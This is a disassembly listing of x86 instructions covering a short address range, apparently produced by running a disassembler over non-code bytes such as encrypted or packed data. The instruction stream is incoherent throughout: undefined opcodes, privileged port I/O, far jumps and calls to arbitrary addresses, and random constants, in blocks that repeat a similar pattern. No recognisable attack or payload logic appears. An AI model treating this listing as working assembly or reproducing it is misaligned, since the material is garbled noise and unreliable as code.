  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    edi,DWORD PTR [ebp-0x43]
  417082:	sbb    bh,cl
  417084:	xor    ebx,0x1050000
  41708a:	add    BYTE PTR [eax],al
  41708c:	int    0x1b
  41708e:	mov    edx,0x8c02b50
  417093:	lahf   
  417094:	into   
  417095:	add    BYTE PTR [ecx],0x1a
  417098:	rcr    DWORD PTR [ebp+0xefd0902],cl
  41709e:	sahf   
  41709f:	push   ds
  4170a0:	jae    0x417101
  4170a2:	push   eax
  4170a3:	jle    0x417124
  4170a5:	inc    edx
  4170a6:	out    dx,eax
  4170a7:	pop    ebx
  4170a8:	xor    BYTE PTR [eax-0x3c49e05],bl
  4170ae:	test   DWORD PTR [edi+0xa],0x7d21774b
  4170b5:	mov    edi,0xba66603f
  4170ba:	jle    0x417074
  4170bc:	les    ebp,FWORD PTR [esi]
  4170be:	or     al,0xff
  4170c0:	ja     0x4170db
  4170c2:	sahf   
  4170c3:	dec    ebx
  4170c4:	xor    al,0x61
  4170c6:	fistp  WORD PTR [edx]
  4170c8:	pop    esi
  4170c9:	data16 jnp 0x4170d0
  4170cc:	inc    edx
  4170cd:	(bad)  [edi]
  4170cf:	and    DWORD PTR ds:0xeb3d605b,ecx
  4170d5:	cs xchg edi,eax
  4170d7:	cmp    cl,BYTE PTR [ecx+0x7f75075d]
  4170dd:	inc    ecx
  4170de:	jl     0x4170a9
  4170e0:	xchg   edx,eax
  4170e1:	cmp    ebp,DWORD PTR [ebp-0x3c]
  4170e4:	xor    al,0x5f
  4170e6:	scas   al,BYTE PTR es:[edi]
  4170e7:	nop
  4170e8:	out    dx,eax
  4170e9:	or     DWORD PTR [eax-0x718a55e0],edx
  4170ef:	lods   eax,DWORD PTR ds:[esi]
  4170f0:	nop
  4170f1:	out    dx,al
  4170f2:	sbb    DWORD PTR [ebx],edi
  4170f4:	call   0x9a804252
  4170f9:	popa   
  4170fa:	imul   esp,DWORD PTR [edi],0x7d698cf2
  417100:	pop    es
  417101:	mov    ch,0x49
  417103:	adc    eax,0x55fb5d01
  417108:	out    0xf5,al
  41710a:	aad    0xb9
  41710c:	loopne 0x4170cf
  41710e:	popa   
  41710f:	das    
  417110:	pop    edi
  417111:	icebp  
  417112:	(bad)  
  417115:	(bad)  
  417116:	shl    ebx,1
  417118:	inc    ebx
  417119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41711a:	dec    ecx
  41711b:	push   cs
  41711c:	daa    
  41711d:	inc    ebp
  41711e:	in     eax,0xa5
  417120:	mov    DWORD PTR [ebp+edi*2-0x682d5701],ebx
  417127:	jno    0x41712b
  417129:	scas   al,BYTE PTR es:[edi]
  41712a:	and    eax,0x23375772
  41712f:	mov    ah,0x35
  417132:	ins    DWORD PTR es:[edi],dx
  417133:	ds (bad) 
  417135:	push   eax
  417136:	inc    ebx
  417138:	xor    BYTE PTR [ebx+0x1c],0x9b
  41713c:	repnz fistp DWORD PTR [ebx+ecx*8+0x16]
  417141:	mov    ch,BYTE PTR [edi*8+0x32976602]
  417148:	jnp    0x4170ca
  41714a:	cmp    eax,0xe5f4f1d2
  41714f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417150:	cmp    ebx,DWORD PTR [edi-0x74]
  417153:	addr16 dec edi
  417155:	mov    al,0xe2
  417157:	xchg   DWORD PTR [ebp+0x7d417cd2],esi
  41715d:	cmp    dl,BYTE PTR [eax+0x19426552]
  417163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417164:	(bad)  
  417165:	and    bl,cl
  417167:	xchg   ebx,eax
  417168:	mov    ch,0x2b
  41716a:	dec    esp
  41716b:	out    0xe7,al
  41716d:	cmp    cl,BYTE PTR [ecx-0x4f]
  417170:	cmp    ecx,DWORD PTR [edi+0x66d0c7d7]
  417176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417177:	sub    eax,ebx
  417179:	mov    cl,0x2e
  41717b:	dec    edi
  41717c:	xchg   ebx,eax
  41717d:	retf   0x4484
  417180:	pusha  
  417181:	dec    ecx
  417182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417183:	xor    eax,0x52371ee0
  417188:	pop    esi
  417189:	xchg   BYTE PTR [ebx*1-0x2adb4b63],dh
  417190:	push   ebp
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	mov    ebp,edi
  417202:	mov    eax,0xf486ea
  417207:	add    BYTE PTR ds:0x1b000001,al
  41720d:	jns    0x4171b6
  41720f:	mov    esi,DWORD PTR [ebx+eiz*1-0x1c34347]
  417216:	lahf   
  417217:	out    dx,eax
  417218:	rol    BYTE PTR [edi-0x541fba82],0x34
  41721f:	arpl   ax,dx
  417221:	ret    
  417222:	dec    edi
  417223:	push   edi
  417224:	sub    al,0x1c
  417226:	shl    DWORD PTR [ecx+0x12],0x2f
  41722a:	jp     0x417256
  41722c:	jne    0x417227
  41722e:	arpl   WORD PTR [eax+0x1ab25716],cx
  417234:	call   0x70b9ee51
  417239:	and    ebp,ebp
  41723b:	div    edi
  41723d:	fmul   QWORD PTR [edi+0xc09590b]
  417243:	or     BYTE PTR [ebx],dl
  417245:	imul   ebx,DWORD PTR [edi+ebx*8],0x5c
  417249:	mov    bl,BYTE PTR [ebx-0x8e43008]
  41724f:	adc    cl,ch
  417251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417252:	or     al,0x48
  417254:	aas    
  417255:	shr    BYTE PTR [esi-0x3e7a4822],1
  41725b:	outs   dx,BYTE PTR ds:[esi]
  41725c:	mov    cs,ebx
  41725e:	and    DWORD PTR [ecx+0x6b824d72],esi
  417264:	arpl   dx,sp
  417266:	lahf   
  417267:	sub    DWORD PTR [ecx-0x63f5b80a],esi
  41726d:	fcom   DWORD PTR [edx+esi*2]
  417270:	jecxz  0x4172c1
  417272:	fisubr WORD PTR [esi]
  417274:	out    dx,al
  417275:	or     al,cl
  417277:	cdq    
  417278:	out    0x2b,eax
  41727a:	(bad)  
  41727c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41727d:	pop    es
  41727e:	mov    dh,BYTE PTR [eax+0x51]
  417281:	lods   eax,DWORD PTR ds:[esi]
  417282:	sub    dl,dh
  417284:	jo     0x417235
  417286:	jb     0x417261
  417288:	retf   0x8a45
  41728b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41728c:	cdq    
  41728d:	xchg   edx,eax
  41728e:	push   es
  41728f:	rcl    DWORD PTR [edi-0x10e24aeb],0x51
  417296:	cmp    dh,BYTE PTR [ebx]
  417298:	add    DWORD PTR [ecx],0xffffff9b
  41729b:	in     al,dx
  41729c:	scas   eax,DWORD PTR es:[edi]
  41729d:	add    BYTE PTR [esp+eax*4],bh
  4172a0:	cmp    eax,DWORD PTR [ecx-0x35cc0461]
  4172a6:	xor    dl,ah
  4172a8:	inc    ebx
  4172a9:	jmp    0x1476f558
  4172ae:	pop    ss
  4172af:	mov    ecx,0xb11f798c
  4172b4:	xchg   edi,eax
  4172b5:	sbb    ebp,DWORD PTR [edx-0x43]
  4172b8:	fnstenv [ebx+0x80f0b18]
  4172be:	enter  0x3f61,0x91
  4172c2:	fld    TBYTE PTR [esi+0x56]
  4172c5:	jno    0x417302
  4172c7:	jo     0x4172e4
  4172c9:	adc    eax,0xe7553870
  4172ce:	pop    ds
  4172cf:	mov    esp,es
  4172d1:	pop    bp
  4172d3:	sub    al,0x34
  4172d5:	xchg   edx,eax
  4172d6:	outs   dx,DWORD PTR ds:[esi]
  4172d7:	outs   dx,DWORD PTR ds:[esi]
  4172d8:	jb     0x4172e2
  4172da:	outs   dx,DWORD PTR ds:[esi]
  4172db:	or     DWORD PTR [edi+0x1cae9676],edi
  4172e1:	inc    ecx
  4172e2:	push   ecx
  4172e3:	out    0x44,al
  4172e5:	repz mov ebp,0x4ff9c8e
  4172eb:	mov    al,0x8f
  4172ed:	imul   ebx,DWORD PTR [esi+0x49],0x45
  4172f1:	fwait
  4172f2:	leave  
  4172f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172f4:	or     eax,0x394114ac
  4172f9:	enter  0xfcae,0x84
  4172fd:	or     DWORD PTR [esp+eiz*8-0x2f9228cd],esi
  417304:	inc    edi
  417305:	dec    esp
  417306:	or     eax,0x53b2bd71
  41730b:	sub    al,0xb4
  41730d:	(bad)  
  41730e:	retf   
  41730f:	in     al,dx
  417310:	int3   
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	mov    DWORD PTR [ecx],0xf58bab1a
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0xe8000001
  41738d:	div    esp
  41738f:	add    dh,BYTE PTR [ebp-0x441870f5]
  417395:	iret   
  417396:	(bad)  
  417397:	mov    ch,0x46
  417399:	dec    ecx
  41739a:	sbb    eax,0x3c1a0dc8
  41739f:	aam    0x70
  4173a1:	out    0x14,eax
  4173a3:	pop    ebx
  4173a4:	and    eax,0x3a3ce9a6
  4173a9:	sub    ecx,edx
  4173ab:	inc    edi
  4173ac:	xor    DWORD PTR [ecx+edi*1+0x3c],edi
  4173b0:	fisttp WORD PTR [ebp+0xd393c3d]
  4173b6:	gs pop esi
  4173b8:	nop
  4173b9:	ret    
  4173ba:	xlat   BYTE PTR ds:[ebx]
  4173bb:	inc    eax
  4173bc:	jnp    0x417427
  4173be:	jae    0x417370
  4173c0:	mov    eax,0xa3add10b
  4173c5:	or     DWORD PTR [edi],0x940a1b75
  4173cb:	pop    ecx
  4173cc:	inc    edx
  4173cd:	xchg   esp,eax
  4173ce:	mov    dl,0xba
  4173d0:	test   DWORD PTR [esi-0x1c],ebp
  4173d3:	lods   eax,DWORD PTR ds:[esi]
  4173d4:	mov    esp,0x1a4cc3b9
  4173d9:	bound  edx,QWORD PTR [ecx-0x36]
  4173dc:	mov    al,ds:0x64e082f2
  4173e1:	or     WORD PTR [esi+0x47],bx
  4173e5:	mov    ds,WORD PTR [ebx+0x4f419afd]
  4173eb:	or     eax,0xfc0b7a49
  4173f0:	mov    ebp,0xc0ac1313
  4173f5:	mov    esi,0x240e5321
  4173fa:	dec    ebx
  4173fb:	mov    eax,0xd39e7856
  417400:	mov    dh,0x31
  417402:	sub    BYTE PTR [ecx+0x42bd8c10],ah
  417408:	lahf   
  417409:	or     bl,0x2f
  41740c:	idiv   BYTE PTR [edx-0x5c]
  41740f:	leave  
  417410:	cmp    eax,0x8f4b6095
  417415:	xor    eax,0x11cfd7f
  41741a:	clc    
  41741b:	jbe    0x417486
  41741d:	hlt    
  41741e:	sti    
  41741f:	dec    edi
  417420:	or     DWORD PTR [ecx+0x55877659],0xffffffc2
  417427:	dec    ecx
  417428:	lea    esi,[eax-0x1ce02dde]
  41742e:	jmp    0x33e6:0x1554a32a
  417435:	ins    DWORD PTR es:[edi],dx
  417436:	jo     0x4173d3
  417438:	scas   al,BYTE PTR es:[edi]
  417439:	jmp    0xd2bd:0x62850dca
  417440:	mov    ecx,0x4be67246
  417445:	fistp  WORD PTR [edx-0x7c869022]
  41744b:	int3   
  41744c:	mov    ebp,ecx
  41744e:	lock out 0xb8,eax
  417451:	jnp    0x417483
  417453:	test   BYTE PTR [ecx+0x7d],0x9a
  417457:	call   0xc7bc248c
  41745c:	xchg   ecx,eax
  41745d:	fwait
  41745e:	and    BYTE PTR [ebp-0x75e4be4e],0x6
  417465:	fsubr  DWORD PTR [ebx-0x1df7f1c6]
  41746b:	inc    esi
  41746c:	bound  esp,QWORD PTR [ecx-0x39cd4c85]
  417472:	mov    ah,BYTE PTR [ebx-0x57]
  417475:	loop   0x417495
  417477:	xlat   BYTE PTR ds:[ebx]
  417478:	call   0x91f82e60
  41747d:	add    ebx,DWORD PTR [ebp-0x4cfceeee]
  417483:	imul   ecx,DWORD PTR [esi+0x53],0x65ef33d4
  41748a:	sub    BYTE PTR [edi+edx*8],bh
  41748d:	fidiv  DWORD PTR [esi+eiz*4]
  417490:	lods   eax,DWORD PTR ds:[esi]
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	ret    0xe304
  417503:	call   0x426b98
  417508:	add    eax,0x2b000001
  41750d:	pop    es
  41750e:	pop    ss
  41750f:	lahf   
  417510:	or     dh,BYTE PTR [ebx-0x4e64adf3]
  417516:	mov    BYTE PTR [eax+0x40],ch
  417519:	(bad)  
  41751a:	data16 lods al,BYTE PTR ds:[esi]
  41751c:	test   BYTE PTR [edi],dh
  41751e:	pop    ds
  41751f:	rcr    DWORD PTR [ebp+ebp*2+0x123aaa83],1
  417526:	push   0xffffffa3
  417528:	shl    DWORD PTR ds:0x8c2cac48,cl
  41752e:	add    ebx,0xc1362f03
  417534:	mov    ecx,0x6b077d6e
  417539:	jecxz  0x41754e
  41753b:	mov    ds:0x71ac3319,al
  417540:	test   dl,al
  417542:	js     0x4175b3
  417544:	cmp    ebx,DWORD PTR [ecx+0x79]
  417547:	imul   ebx,ebx,0xa9e079af
  41754d:	fcomp  DWORD PTR [ecx]
  41754f:	lock loopne 0x41755d
  417552:	push   edi
  417553:	mov    BYTE PTR [edx],al
  417555:	ficom  DWORD PTR [ebx-0x9274bec]
  41755b:	lahf   
  41755c:	cli    
  41755d:	addr16 jmp 0x4175b8
  417560:	push   ds
  417561:	ret    
  417562:	xchg   ecx,eax
  417563:	test   al,0xa6
  417565:	es psubsb mm7,mm6
  417569:	imul   ecx,DWORD PTR [ebp+0x7fafb629],0x49c7587a
  417573:	mov    bl,0x58
  417575:	scas   al,BYTE PTR es:[edi]
  417576:	jmp    0xebb8b267
  41757b:	jecxz  0x417511
  41757d:	dec    ebp
  41757e:	mov    al,0x21
  417580:	(bad)  
  417581:	fcom   QWORD PTR ds:0x4bfba0b5
  417587:	adc    edx,0x4470eb0d
  41758d:	add    DWORD PTR [esp+ebx*2-0x4d1d78ec],0x35
  417595:	test   edi,ecx
  417597:	jp     0x4175b6
  417599:	pop    edi
  41759a:	sahf   
  41759b:	push   0xe518816c
  4175a0:	inc    esi
  4175a1:	lock or esi,DWORD PTR [ebp+0x30671cbd]
  4175a8:	out    0x8d,al
  4175aa:	pop    edi
  4175ab:	cld    
  4175ac:	inc    edx
  4175ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175ae:	sub    DWORD PTR [ebp+0x5f],ebx
  4175b1:	mov    dh,BYTE PTR [ecx]
  4175b3:	xchg   BYTE PTR [edi+0x3cc3ca59],cl
  4175b9:	int    0x18
  4175bb:	outs   dx,DWORD PTR ds:[esi]
  4175bc:	jne    0x41763b
  4175be:	lahf   
  4175bf:	(bad)  
  4175c0:	je     0x417546
  4175c2:	lods   eax,DWORD PTR ds:[esi]
  4175c3:	shl    BYTE PTR [eax+0x6f58ead1],1
  4175c9:	jbe    0x4175fc
  4175cb:	sbb    ch,BYTE PTR [eax-0x7e4e60cc]
  4175d1:	in     al,0x69
  4175d3:	push   esi
  4175d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175d5:	jl     0x41761d
  4175d7:	stos   DWORD PTR es:[edi],eax
  4175d8:	addps  xmm7,XMMWORD PTR [ebx+0x7e]
  4175dc:	add    al,0x48
  4175de:	fsub   QWORD PTR [ecx+0x5b3d1423]
  4175e4:	jae    0x41761e
  4175e6:	mov    ebp,0x148e4f31
  4175eb:	in     al,dx
  4175ec:	fisub  WORD PTR [edi-0x7e]
  4175ef:	xchg   esi,eax
  4175f0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175f2:	pop    esi
  4175f3:	mov    ebp,DWORD PTR [edx+eiz*2]
  4175f6:	mov    esp,0xd6578d03
  4175fb:	lods   eax,DWORD PTR ds:[esi]
  4175fc:	stos   BYTE PTR es:[edi],al
  4175fd:	je     0x4175d7
  4175ff:	sub    al,BYTE PTR [edx-0x16]
  417602:	jg     0x417627
  417604:	pop    edx
  417605:	push   esi
  417606:	shr    DWORD PTR [edx],1
  417608:	mov    BYTE PTR [ecx],dl
  41760a:	adc    dl,BYTE PTR [esi+0x7428bf9b]
  417610:	mov    al,BYTE PTR [eax]
	...
  417672:	add    BYTE PTR [eax],al
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fisubr DWORD PTR [ebp-0x6aacdaae]
  417685:	test   DWORD PTR [eax],0x10500
  41768b:	add    BYTE PTR [ebp+0x1d],ah
  41768e:	add    esp,esi
  417690:	push   ss
  417691:	nop
  417692:	cmc    
  417693:	rcl    edx,1
  417695:	push   es
  417696:	push   esi
  417697:	or     eax,0x549fdc6
  41769c:	mov    DWORD PTR [ecx-0x42616beb],ebp
  4176a2:	mov    ecx,0x39908ac
  4176a7:	jecxz  0x41770f
  4176a9:	push   esp
  4176aa:	cld    
  4176ab:	test   eax,0x9007510b
  4176b0:	imul   DWORD PTR [ebx+edi*8]
  4176b3:	fisubr DWORD PTR [eax-0x14]
  4176b6:	std    
  4176b7:	sbb    BYTE PTR [ecx],al
  4176b9:	call   0x645f:0xb76292cb
  4176c0:	imul   edx,DWORD PTR [ebx+eiz*8+0x29],0x9fbbd6a3
  4176c8:	jge    0x417700
  4176ca:	dec    edx
  4176cb:	shl    BYTE PTR ds:0x1b24e225,0xed
  4176d2:	jmp    0x21eb:0x2e2efda
  4176d9:	mov    BYTE PTR [eax-0x3f7aa2b8],dh
  4176df:	test   BYTE PTR [edx+0x34],0xfd
  4176e3:	jecxz  0x4176f7
  4176e5:	dec    edx
  4176e6:	xlat   BYTE PTR ds:[ebx]
  4176e7:	push   esp
  4176e8:	mov    bl,0x65
  4176ea:	xchg   ebp,eax
  4176eb:	jl     0x4176c9
  4176ed:	or     ch,0x72
  4176f0:	sar    DWORD PTR [ebp+0x626a5c87],cl
  4176f6:	fldcw  WORD PTR [eax]
  4176f8:	cli    
  4176f9:	adc    bl,dl
  4176fb:	test   eax,0xaa0a043c
  417700:	push   cs
  417701:	scas   eax,DWORD PTR es:[edi]
  417702:	mov    eax,fs
  417704:	stc    
  417705:	arpl   di,sp
  417707:	dec    edi
  417708:	pop    ebx
  417709:	ins    BYTE PTR es:[edi],dx
  41770a:	dec    ebx
  41770b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41770c:	pop    eax
  41770d:	adc    eax,0x4641ac13
  417712:	into   
  417713:	test   eax,0xa1d2cafd
  417718:	(bad)  
  417719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41771a:	inc    esp
  41771b:	xchg   esp,eax
  41771c:	out    dx,eax
  41771d:	mov    bh,0x17
  41771f:	adc    DWORD PTR [edx],0xffffffaa
  417722:	jne    0x417707
  417724:	xlat   BYTE PTR ds:[ebx]
  417725:	iret   
  417726:	mov    fs,WORD PTR [ebx+0x20c92690]
  41772c:	mov    al,ds:0x54dfce57
  417731:	mov    ah,0xb
  417733:	sbb    al,0xe1
  417735:	sbb    edx,DWORD PTR [edx]
  417737:	add    ah,BYTE PTR [ecx+0x420edfa6]
  41773d:	jle    0x4177a9
  41773f:	call   0x40e01fd6
  417744:	xchg   BYTE PTR [ebx-0x69],ah
  417747:	cld    
  417748:	pop    edx
  417749:	push   0xffffff95
  41774b:	and    eax,0xf74f2a51
  417750:	push   es
  417751:	sbb    DWORD PTR [ebx-0x16],ebx
  417754:	sbb    al,0x37
  417756:	jbe    0x4177cb
  417758:	pop    eax
  417759:	dec    ebp
  41775a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41775c:	hlt    
  41775d:	cwde   
  41775e:	jg     0x41774c
  417760:	fst    QWORD PTR [eax]
  417762:	inc    eax
  417763:	sbb    al,0x2c
  417765:	jns    0x417708
  417767:	jle    0x417779
  417769:	dec    esi
  41776a:	inc    esp
  41776b:	test   eax,0x4eba56cb
  417770:	cmp    al,0x40
  417772:	push   0xef248e3c
  417777:	int    0xba
  417779:	jns    0x41773c
  41777b:	mov    ds:0xdb5a0ad3,al
  417780:	mov    eax,0x2d87c30f
  417785:	mov    al,0x36
  417787:	push   ebp
  417788:	add    DWORD PTR [ebx+0x51],eax
  41778b:	int3   
  41778c:	(bad)  
  41778d:	leave  
  41778e:	pop    edi
  41778f:	push   eax
  417790:	jnp    0x417792
	...
  4177f2:	add    BYTE PTR [eax],al
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	mov    ds:0x9af63061,al
  417805:	clc    
  417806:	add    BYTE PTR [eax],al
  417808:	add    eax,0x4e000001
  41780d:	push   es
  41780e:	jbe    0x4177ed
  417810:	(bad)  
  417811:	jl     0x417881
  417813:	sbb    dl,BYTE PTR [ebp+0x41893a55]
  417819:	rcl    bl,0x68
  41781c:	adc    ecx,edx
  41781e:	popa   
  41781f:	push   ebp
  417820:	rcr    bh,cl
  417822:	in     al,dx
  417823:	lds    ecx,FWORD PTR [esi]
  417825:	(bad)  
  417826:	imul   BYTE PTR [edx+eiz*1-0x2a]
  41782a:	aas    
  41782b:	test   bl,bh
  41782d:	out    0x87,eax
  41782f:	xor    eax,0xda53efb
  417834:	push   ebp
  417835:	fmul   QWORD PTR [esi]
  417837:	(bad)  
  417838:	ror    DWORD PTR [esi-0x30],0x4e
  41783c:	jnp    0x41780b
  41783e:	push   edi
  41783f:	or     edi,DWORD PTR [bp+di-0x3c]
  417843:	ror    DWORD PTR [ebx+0x7edd036b],0x92
  41784a:	ja     0x41788d
  41784c:	mov    ds:0x6442d10c,eax
  417851:	inc    eax
  417852:	mov    dh,0x2
  417854:	mov    bh,0x1b
  417856:	ret    
  417857:	mov    esi,0x4d306188
  41785c:	clc    
  41785d:	retf   0x62cb
  417860:	dec    eax
  417861:	pop    ebp
  417862:	cdq    
  417863:	mov    eax,0xb5eeca24
  417868:	fmul   DWORD PTR [edx-0x75]
  41786b:	pop    eax
  41786c:	in     eax,0x38
  41786e:	ds gs push esi
  417871:	test   al,0xff
  417873:	dec    ecx
  417874:	das    
  417875:	fst    QWORD PTR [edi+0x64cf3fc]
  41787b:	(bad)  
  41787d:	fwait
  41787e:	mov    eax,0x72641620
  417883:	aad    0x64
  417885:	popa   
  417886:	fisttp WORD PTR [edx-0x7]
  417889:	mov    esp,0x56ceaf6a
  41788e:	pop    ecx
  41788f:	dec    esi
  417890:	dec    esp
  417891:	ins    BYTE PTR es:[edi],dx
  417892:	sti    
  417893:	mov    al,ds:0xe5813264
  417898:	out    dx,eax
  417899:	in     al,0x31
  41789b:	add    al,0xd
  41789d:	addr16 adc cl,bl
  4178a0:	imul   ebp,DWORD PTR [eax+eax*2],0xffffffce
  4178a4:	xchg   DWORD PTR [esi-0x7af43339],ebx
  4178aa:	inc    ebx
  4178ab:	or     dh,BYTE PTR [esi]
  4178ad:	push   ebp
  4178ae:	sbb    bl,BYTE PTR [ecx-0x3ed7b940]
  4178b4:	sbb    eax,0x7d7c1fff
  4178b9:	mov    BYTE PTR [edx+0x4c],0x4d
  4178bd:	int    0xef
  4178bf:	dec    ecx
  4178c0:	jnp    0x4178bc
  4178c2:	mov    edi,0x9301388a
  4178c7:	icebp  
  4178c8:	(bad)  [ebx-0x71]
  4178cb:	sbb    eax,0x30d145e9
  4178d0:	scas   eax,DWORD PTR es:[edi]
  4178d1:	xor    BYTE PTR [esi+0x7f752498],ch
  4178d7:	add    al,0x1c
  4178d9:	aas    
  4178da:	imul   ebp,DWORD PTR [ecx+0x48ac835c],0x30f7caf1
  4178e4:	stos   BYTE PTR es:[edi],al
  4178e5:	add    eax,0x6f3c1a7
  4178ea:	cwde   
  4178eb:	xchg   edi,eax
  4178ec:	lods   al,BYTE PTR ds:[esi]
  4178ed:	add    BYTE PTR [edi+0x1e069aec],dh
  4178f3:	rcr    esi,0x81
  4178f6:	bound  edx,QWORD PTR [ecx-0x3]
  4178f9:	sbb    BYTE PTR [ebx],cl
  4178fb:	lds    ebp,FWORD PTR [edi]
  4178fd:	scas   eax,DWORD PTR es:[edi]
  4178fe:	or     ch,BYTE PTR [esi-0x12]
  417901:	pop    ss
  417902:	cmp    eax,0x1c495092
  417907:	fmul   DWORD PTR [edx+0x43]
  41790a:	fisttp QWORD PTR [ebx]
  41790c:	push   esp
  41790d:	xchg   ebx,eax
  41790e:	cmp    ebx,DWORD PTR [ebp-0x9]
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	push   es
  417981:	or     DWORD PTR [esi-0x6e],0xf99f
  417988:	add    eax,0xe9000001
  41798d:	int    0x34
  41798f:	fmul   st,st(3)
  417991:	mov    edi,0xe2f922a6
  417996:	add    DWORD PTR [esi-0x6f7c0311],esp
  41799c:	adc    al,0x68
  41799e:	call   0xcc170c3f
  4179a3:	popf   
  4179a4:	pop    esp
  4179a5:	repz sub bh,BYTE PTR [ebx]
  4179a8:	sub    eax,0x3eb9721e
  4179ad:	jo     0x417973
  4179af:	fist   WORD PTR [ebx+esi*1-0x72633eab]
  4179b6:	xor    BYTE PTR [edx],ch
  4179b8:	jne    0x417a25
  4179ba:	jno    0x4179ad
  4179bc:	sub    BYTE PTR ds:0xc8f73310,al
  4179c2:	rol    DWORD PTR [eax-0x65d413cc],cl
  4179c8:	aas    
  4179c9:	mov    eax,ds:0xb1e938c
  4179ce:	sub    esp,DWORD PTR [edi-0x3bcbe1c6]
  4179d4:	sub    BYTE PTR [esi+0x70915bc],cl
  4179da:	shl    DWORD PTR [ebx+0x13],1
  4179dd:	sub    al,0x86
  4179df:	push   eax
  4179e0:	or     eax,0x9365e728
  4179e5:	mov    ch,0x53
  4179e7:	mov    DWORD PTR [edx+edx*8],ebp
  4179ea:	stos   BYTE PTR es:[edi],al
  4179eb:	inc    DWORD PTR ds:0x6b257a27
  4179f1:	lahf   
  4179f2:	or     esi,DWORD PTR [ecx+ecx*1-0x49fa23f2]
  4179f9:	add    cl,BYTE PTR [edx+0x47c8bf51]
  4179ff:	pop    esp
  417a00:	xchg   esp,eax
  417a01:	int3   
  417a02:	mov    WORD PTR [eax],cs
  417a04:	test   eax,0xc35d0434
  417a0a:	xor    eax,0x969d1d72
  417a0f:	aad    0x1c
  417a11:	pop    es
  417a12:	aas    
  417a13:	fidivr DWORD PTR [ecx+0x25]
  417a16:	jp     0x417a00
  417a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a19:	cmc    
  417a1a:	push   cs
  417a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a1c:	ss in  al,dx
  417a1e:	cld    
  417a1f:	(bad)
  417a22:	sub    edx,0x17e859a0
  417a28:	add    cl,BYTE PTR [edi]
  417a2a:	outs   dx,DWORD PTR ds:[esi]
  417a2b:	popf   
  417a2c:	adc    al,0x10
  417a2e:	popa   
  417a2f:	stc    
  417a30:	adc    eax,0xf890466b
  417a35:	rcr    BYTE PTR [ebp+eiz*1-0x31231344],cl
  417a3c:	int3   
  417a3d:	mov    cl,bl
  417a3f:	lods   eax,DWORD PTR ds:[esi]
  417a40:	pop    esp
  417a41:	mov    al,0x75
  417a43:	sub    DWORD PTR [ebx+0x0],ebx
  417a46:	mov    eax,0x59a94dd8
  417a4b:	xor    eax,0x30a2d98f
  417a50:	je     0x4179ec
  417a52:	mov    ah,0x58
  417a54:	data16 mov ah,BYTE PTR gs:[edx+0x34e2fa8c]
  417a5c:	adc    eax,0x836b210d
  417a61:	mov    esi,0x54515622
  417a66:	(bad)
  417a6a:	push   ss
  417a6b:	pusha  
  417a6c:	pop    ebp
  417a6d:	xchg   ebp,eax
  417a6e:	(bad)  
  417a70:	mov    bl,0xb1
  417a72:	or     eax,0x2dbb32bb
  417a77:	test   al,0x6c
  417a79:	pop    ecx
  417a7a:	jecxz  0x417ac1
  417a7c:	sbb    ebp,esp
  417a7e:	mov    ecx,DWORD PTR [ebx-0x6aae0038]
  417a84:	adc    dh,BYTE PTR [eax+0x18]
  417a87:	jb     0x417ac4
  417a89:	push   0xa6f11a5b
  417a8e:	in     al,dx
  417a8f:	and    BYTE PTR [eax],cl
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0x1fa4b0e4]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0x96000001
  417b0d:	pop    ebx
  417b0e:	mov    ah,0xd7
  417b10:	mov    bh,0x7f
  417b12:	push   cs
  417b13:	jg     0x417b22
  417b15:	adc    eax,0x4f8e560
  417b1a:	clc    
  417b1b:	js     0x417b74
  417b1d:	(bad)  
  417b1e:	sbb    ch,bl
  417b20:	int    0x6a
  417b22:	add    ebp,DWORD PTR [ebx]
